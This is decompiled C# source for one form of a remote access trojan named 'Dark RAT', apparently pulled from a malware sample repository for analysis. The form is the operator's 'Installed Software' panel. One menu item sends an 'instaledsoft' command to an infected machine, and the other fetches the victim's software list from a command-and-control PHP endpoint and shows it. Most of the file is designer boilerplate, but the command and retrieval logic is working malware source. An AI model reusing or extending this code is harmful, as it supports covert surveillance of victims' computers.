// Decompiled with JetBrains decompiler
// Type: Dark_RAT.soft
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class soft : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("ListView1")]
    private ListView _ListView1;
    [AccessedThroughProperty("ColumnHeader1")]
    private ColumnHeader _ColumnHeader1;
    [AccessedThroughProperty("ColumnHeader2")]
    private ColumnHeader _ColumnHeader2;
    [AccessedThroughProperty("menu")]
    private ContextMenuStrip _menu;
    [AccessedThroughProperty("RequestToolStripMenuItem")]
    private ToolStripMenuItem _RequestToolStripMenuItem;
    [AccessedThroughProperty("GetToolStripMenuItem")]
    private ToolStripMenuItem _GetToolStripMenuItem;

    [DebuggerNonUserCode]
    static soft()
    {
    }

    [DebuggerNonUserCode]
    public soft()
    {
      soft.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (soft.__ENCList)
      {
        if (soft.__ENCList.Count == soft.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (soft.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (soft.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                soft.__ENCList[index1] = soft.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          soft.__ENCList.RemoveRange(index1, checked (soft.__ENCList.Count - index1));
          soft.__ENCList.Capacity = soft.__ENCList.Count;
        }
        soft.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (soft));
      this.ListView1 = new ListView();
      this.ColumnHeader1 = new ColumnHeader();
      this.ColumnHeader2 = new ColumnHeader();
      this.menu = new ContextMenuStrip(this.components);
      this.RequestToolStripMenuItem = new ToolStripMenuItem();
      this.GetToolStripMenuItem = new ToolStripMenuItem();
      this.menu.SuspendLayout();
      this.SuspendLayout();
      this.ListView1.Columns.AddRange(new ColumnHeader[2]
      {
        this.ColumnHeader1,
        this.ColumnHeader2
      });
      this.ListView1.ContextMenuStrip = this.menu;
      this.ListView1.Dock = DockStyle.Fill;
      this.ListView1.Location = new Point(0, 0);
      this.ListView1.Name = "ListView1";
      ListView listView1 = this.ListView1;
      Size size1 = new Size(657, 358);
      Size size2 = size1;
      listView1.Size = size2;
      this.ListView1.TabIndex = 5;
      this.ListView1.UseCompatibleStateImageBehavior = false;
      this.ListView1.View = View.Details;
      this.ColumnHeader1.Text = "Name";
      this.ColumnHeader1.Width = 102;
      this.ColumnHeader2.Text = "Location";
      this.ColumnHeader2.Width = 475;
      this.menu.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.RequestToolStripMenuItem,
        (ToolStripItem) this.GetToolStripMenuItem
      });
      this.menu.Name = "menu";
      ContextMenuStrip menu = this.menu;
      size1 = new Size(153, 70);
      Size size3 = size1;
      menu.Size = size3;
      this.RequestToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RequestToolStripMenuItem.Image");
      this.RequestToolStripMenuItem.Name = "RequestToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem1 = this.RequestToolStripMenuItem;
      size1 = new Size(152, 22);
      Size size4 = size1;
      toolStripMenuItem1.Size = size4;
      this.RequestToolStripMenuItem.Text = "Request";
      this.GetToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("GetToolStripMenuItem.Image");
      this.GetToolStripMenuItem.ImageAlign = ContentAlignment.MiddleLeft;
      this.GetToolStripMenuItem.Name = "GetToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem2 = this.GetToolStripMenuItem;
      size1 = new Size(152, 22);
      Size size5 = size1;
      toolStripMenuItem2.Size = size5;
      this.GetToolStripMenuItem.Text = "Get";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(657, 358);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ListView1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.Name = nameof (soft);
      this.Text = "Installed Software";
      this.menu.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    internal virtual ListView ListView1
    {
      [DebuggerNonUserCode] get => this._ListView1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ListView1 = value;
    }

    internal virtual ColumnHeader ColumnHeader1
    {
      [DebuggerNonUserCode] get => this._ColumnHeader1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader1 = value;
    }

    internal virtual ColumnHeader ColumnHeader2
    {
      [DebuggerNonUserCode] get => this._ColumnHeader2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader2 = value;
    }

    internal virtual ContextMenuStrip menu
    {
      [DebuggerNonUserCode] get => this._menu;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._menu = value;
    }

    internal virtual ToolStripMenuItem RequestToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RequestToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RequestToolStripMenuItem_Click);
        if (this._RequestToolStripMenuItem != null)
          this._RequestToolStripMenuItem.Click -= eventHandler;
        this._RequestToolStripMenuItem = value;
        if (this._RequestToolStripMenuItem == null)
          return;
        this._RequestToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem GetToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._GetToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.GetToolStripMenuItem_Click);
        if (this._GetToolStripMenuItem != null)
          this._GetToolStripMenuItem.Click -= eventHandler;
        this._GetToolStripMenuItem = value;
        if (this._GetToolStripMenuItem == null)
          return;
        this._GetToolStripMenuItem.Click += eventHandler;
      }
    }

    private void RequestToolStripMenuItem_Click(object sender, EventArgs e) => MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|instaledsoft|"));

    private void GetToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string Expression1 = new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "other/installed/data.php?action=read");
        int num = Conversions.ToInteger("0");
        this.ListView1.Items.Clear();
        string[] strArray1 = Strings.Split(Expression1, "\r\n");
        int index = 0;
        while (index < strArray1.Length)
        {
          string Expression2 = strArray1[index];
          if (Expression2.ToString().Contains("|"))
          {
            string[] strArray2 = Strings.Split(Expression2, "|");
            this.ListView1.Items.Add(strArray2[0]);
            this.ListView1.Items[num].SubItems.Add(strArray2[1]);
            num = checked ((int) Math.Round(unchecked (Conversion.Val((object) num) + Conversion.Val("1"))));
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
